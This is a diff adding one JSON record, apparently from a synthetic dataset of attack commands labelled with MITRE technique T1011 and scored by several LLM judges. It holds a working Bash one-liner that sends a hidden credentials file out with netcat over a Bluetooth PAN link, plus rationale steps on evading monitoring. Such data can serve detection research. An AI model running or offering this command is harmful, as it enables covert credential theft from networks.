@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "nohup tcpdump -i bnep0 -nn udp port 53287 -U -w /dev/null >/dev/null 2>&1 & nc -u -s 192.168.44.10 192.168.44.20 53287 < /var/tmp/.cache/creds.bin",
+  "explanation": "Uses Bluetooth PAN (bnep0) and UDP on a non-standard port to exfiltrate a blob while silently monitoring only that traffic. This is exfiltration over a different network medium per T1011.",
+  "rationale_steps": [
+    "Select Bluetooth PAN to avoid the primary corporate network.",
+    "Use UDP on an uncommon port (53287) to blend with low-noise traffic.",
+    "Run tcpdump scoped to bnep0 and that port to minimize footprint.",
+    "Stream the file with netcat bound to the bnep0 source address."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-a2471e69-e5a3a6fa",
+  "source_prompt_hash": "a2471e69",
+  "timestamp_utc": "2025-09-30T08:19:52.942834Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is a valid Bash one-liner with proper backgrounding, redirections, and recognized tcpdump/netcat flags, with no quoting or parsing issues.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly exfiltrates the blob over a Bluetooth PAN interface via UDP (consistent with T1011), while silently capturing only that traffic, but tcpdump likely requires elevated privileges and writes to /dev/null, and the provided technique description (Automated Exfiltration) is mismatched.",
+        "combined_score": 4.5,
+        "confidence": 0.86,
+        "timestamp": "2025-10-01T03:12:26.535244Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper syntax, balanced quoting, valid flags for both tcpdump and netcat, and correct command chaining with background process handling.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements automated exfiltration by using netcat to transfer data over UDP on a non-standard port (53287) while monitoring the same traffic with tcpdump over a Bluetooth PAN interface, which aligns with the T1011 technique of exfiltrating data over alternative protocols.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T03:12:29.680573Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid syntax for both `tcpdump` and `nc` commands, correct flags, and proper use of backgrounding and redirection.",
+        "semantic_score": 3,
+        "semantic_justification": "While the `nc` portion accurately describes data exfiltration via UDP on a Bluetooth PAN interface, the `tcpdump` portion will fail to monitor traffic due to the explicit 'Privilege: None' constraint, making the 'while silently monitoring' claim operationally implausible.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T05:40:24.141670Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
